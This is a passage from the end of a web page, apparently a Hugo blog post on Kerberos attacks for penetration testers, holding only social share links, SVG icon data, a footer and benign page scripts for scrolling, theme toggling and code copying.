11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Kerberos для специалиста по тестированию на проникновение. Часть 2. Классические атаки. on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fardent101.github.com%2fposts%2fkerberos_general_attacks%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Kerberos для специалиста по тестированию на проникновение. Часть 2. Классические атаки. on whatsapp" href="https://api.whatsapp.com/send?text=Kerberos%20%d0%b4%d0%bb%d1%8f%20%d1%81%d0%bf%d0%b5%d1%86%d0%b8%d0%b0%d0%bb%d0%b8%d1%81%d1%82%d0%b0%20%d0%bf%d0%be%20%d1%82%d0%b5%d1%81%d1%82%d0%b8%d1%80%d0%be%d0%b2%d0%b0%d0%bd%d0%b8%d1%8e%20%d0%bd%d0%b0%20%d0%bf%d1%80%d0%be%d0%bd%d0%b8%d0%ba%d0%bd%d0%be%d0%b2%d0%b5%d0%bd%d0%b8%d0%b5.%20%d0%a7%d0%b0%d1%81%d1%82%d1%8c%202.%20%d0%9a%d0%bb%d0%b0%d1%81%d1%81%d0%b8%d1%87%d0%b5%d1%81%d0%ba%d0%b8%d0%b5%20%d0%b0%d1%82%d0%b0%d0%ba%d0%b8.%20-%20https%3a%2f%2fardent101.github.com%2fposts%2fkerberos_general_attacks%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Kerberos для специалиста по тестированию на проникновение. Часть 2. Классические атаки. on telegram" href="https://telegram.me/share/url?text=Kerberos%20%d0%b4%d0%bb%d1%8f%20%d1%81%d0%bf%d0%b5%d1%86%d0%b8%d0%b0%d0%bb%d0%b8%d1%81%d1%82%d0%b0%20%d0%bf%d0%be%20%d1%82%d0%b5%d1%81%d1%82%d0%b8%d1%80%d0%be%d0%b2%d0%b0%d0%bd%d0%b8%d1%8e%20%d0%bd%d0%b0%20%d0%bf%d1%80%d0%be%d0%bd%d0%b8%d0%ba%d0%bd%d0%be%d0%b2%d0%b5%d0%bd%d0%b8%d0%b5.%20%d0%a7%d0%b0%d1%81%d1%82%d1%8c%202.%20%d0%9a%d0%bb%d0%b0%d1%81%d1%81%d0%b8%d1%87%d0%b5%d1%81%d0%ba%d0%b8%d0%b5%20%d0%b0%d1%82%d0%b0%d0%ba%d0%b8.&url=https%3a%2f%2fardent101.github.com%2fposts%2fkerberos_general_attacks%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://ardent101.github.com/>Ardent101</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerText="copy";function s(){e.innerText="copied!",setTimeout(()=>{e.innerText="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>